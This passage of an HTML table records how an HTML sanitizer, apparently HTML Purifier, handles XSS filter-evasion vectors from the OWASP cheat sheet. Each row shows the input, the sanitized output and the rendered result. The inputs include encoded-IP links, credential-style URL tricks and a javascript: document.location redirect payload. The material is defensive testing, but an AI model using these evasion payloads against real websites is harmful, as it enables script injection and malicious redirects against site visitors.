<div>[XSS](http://htmlpurifier.org/)</div></td>
</tr>
<tr>
<td>Hex Encoding</td>
<td>
<pre>&lt;A »
HREF="http://0x42.0x0000066\. »
0x7.0x93/"&gt;XSS&lt;/A&gt;</pre>
</td>
<td>
<pre>&lt;a href="/"&gt;XSS&lt;/a&gt;</pre>
</td>
<td>
<div>[XSS](http://htmlpurifier.org/)</div></td>
</tr>
<tr>
<td>Octal Encoding</td>
<td>
<pre>&lt;A »
HREF="http://0102.0146.0007\. »
00000223/"&gt;XSS&lt;/A&gt;</pre>
</td>
<td>
<pre>&lt;a href="/"&gt;XSS&lt;/a&gt;</pre>
</td>
<td>
<div>[XSS](http://htmlpurifier.org/)</div></td>
</tr>
<tr>
<td>Mixed Encoding</td>
<td>
<pre>&lt;A »
HREF="h
tt**\t**p://6&amp;#09;6.00014 »
6.0x7.147/"&gt;XSS&lt;/A&gt;</pre>
</td>
<td>
<pre>&lt;a&gt;XSS&lt;/a&gt;</pre>
</td>
<td>
<div><a>XSS</a></div></td>
</tr>
<tr>
<td>Protocol Resolution Bypass</td>
<td>
<pre>&lt;A »
HREF="//www.google.com/"&gt;XSS »
&lt;/A&gt;</pre>
</td>
<td>
<pre>&lt;a&gt;XSS&lt;/a&gt;</pre>
</td>
<td>
<div><a>XSS</a></div></td>
</tr>
<tr>
<td>Firefox Lookups 1</td>
<td>
<pre>&lt;A HREF="//google"&gt;XSS&lt;/A&gt;</pre>
</td>
<td>
<pre>&lt;a href="//google"&gt;XSS&lt;/a&gt;</pre>
</td>
<td>
<div>[XSS](http://google/)</div></td>
</tr>
<tr>
<td>Firefox Lookups 2</td>
<td>
<pre>&lt;A »
HREF="http://ha.ckers.org@go »
ogle"&gt;XSS&lt;/A&gt;</pre>
</td>
<td>
<pre>&lt;a »
href="http://google"&gt;XSS&lt;/a&gt;</pre>
</td>
<td>
<div>[XSS](http://google/)</div></td>
</tr>
<tr>
<td>Firefox Lookups 3</td>
<td>
<pre>&lt;A »
HREF="http://google:ha.ckers »
.org"&gt;XSS&lt;/A&gt;</pre>
</td>
<td>
<pre>&lt;a »
href="http://google"&gt;XSS&lt;/a&gt;</pre>
</td>
<td>
<div>[XSS](http://google/)</div></td>
</tr>
<tr>
<td>Removing Cnames</td>
<td>
<pre>&lt;A »
HREF="http://google.com/"&gt;XS »
S&lt;/A&gt;</pre>
</td>
<td>
<pre>&lt;a&gt;XSS&lt;/a&gt;</pre>
</td>
<td>
<div><a>XSS</a></div></td>
</tr>
<tr>
<td>Extra dot for Absolute DNS</td>
<td>
<pre>&lt;A »
HREF="http://www.google.com. »
/"&gt;XSS&lt;/A&gt;</pre>
</td>
<td>
<pre>&lt;a&gt;XSS&lt;/a&gt;</pre>
</td>
<td>
<div><a>XSS</a></div></td>
</tr>
<tr>
<td>JavaScript Link Location</td>
<td>
<pre>&lt;A »
HREF="javascript:document.lo »
cation='http://www.google.co »
m/'"&gt;XSS&lt;/A&gt;</pre>
</td>
<td>
<pre>&lt;a&gt;XSS&lt;/a&gt;</pre>
</td>
<td>
<div><a>XSS</a></div></td>
</tr>
<tr>
<td>Content Replace</td>
<td>
<pre>&lt;A »
HREF="http://www.gohttp://ww »
w.google.com/ogle.com/"&gt;XSS&lt; »
/A&gt;</pre>
</td>
<td>
<pre>&lt;a »
href="http://www.gohttp//www »
.google.com/ogle.com/"&gt;XSS&lt;/ »
a&gt;</pre>
</td>
<td>
<div>[XSS](http://www.gohttp//www.google.com/ogle.com/)</div></td>
</tr>
</tbody>
</table>
&nbsp;

[https://www.owasp.org/index.php/XSS_Filter_Evasion_Cheat_Sheet](https://www.owasp.org/index.php/XSS_Filter_Evasion_Cheat_Sheet)